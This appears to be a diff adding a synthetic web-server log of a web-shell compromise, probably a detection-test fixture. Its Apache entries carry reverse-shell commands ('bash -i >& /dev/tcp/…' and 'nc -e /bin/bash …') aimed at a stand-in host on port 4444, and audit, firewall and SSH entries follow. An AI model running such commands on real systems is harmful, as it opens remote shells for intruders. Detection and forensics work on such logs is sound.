@@ -1,0 +1,17 @@
+Feb 15 11:20:01 webserver apache2: 203.0.113.170 - - [15/Feb/2026:11:20:01 +0000] "GET /upload.php?cmd=bash -i >& /dev/tcp/203.0.113.200/4444 0>&1 HTTP/1.1" 200 512 "-" "Mozilla/5.0"
+Feb 15 11:20:02 webserver apache2: 203.0.113.170 - - [15/Feb/2026:11:20:02 +0000] "GET /shell.php?cmd=nc -e /bin/bash 203.0.113.200 4444 HTTP/1.1" 200 498 "-" "curl/7.68.0"
+
+Feb 15 11:20:03 webserver kernel: [12345.678901] audit: type=EXECVE msg=audit(1707996003.123:421): argc=3 a0="/bin/bash" a1="-c" a2="bash -i >& /dev/tcp/203.0.113.200/4444 0>&1"
+Feb 15 11:20:03 webserver kernel: [12345.678905] audit: type=SYSCALL msg=audit(1707996003.123:421): arch=c000003e syscall=59 success=yes exit=0 a0=55b8c2f0 a1=55b8c310 a2=55b8c330 items=2 ppid=2145 pid=3261 auid=33 uid=33 gid=33 euid=33 tty=(none) ses=5 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 11:20:04 webserver kernel: [12346.123456] audit: type=SOCKADDR msg=audit(1707996004.456:422): saddr=0200115cCB0071C8
+Feb 15 11:20:04 webserver kernel: [12346.123460] audit: type=SYSCALL msg=audit(1707996004.456:422): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ffc12345678 a2=16 comm="bash" exe="/usr/bin/bash"
+
+Feb 15 11:20:05 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=70001 PROTO=TCP SPT=39822 DPT=4444
+Feb 15 11:20:06 webserver kernel: [UFW ALLOW] OUT=eth0 SRC=192.168.1.20 DST=203.0.113.200 LEN=60 TOS=0x00 TTL=64 ID=70002 PROTO=TCP SPT=39823 DPT=4444
+
+Feb 15 11:20:07 webserver syslog: bash[3261]: connect to 203.0.113.200 port 4444
+Feb 15 11:20:08 webserver syslog: bash[3261]: session established with remote host
+
+Feb 15 11:20:10 webserver sshd[3300]: Accepted password for www-data from 127.0.0.1 port 60222 ssh2
+Feb 15 11:20:10 webserver sshd[3300]: pam_unix(sshd:session): session opened for user www-data by (uid=0)
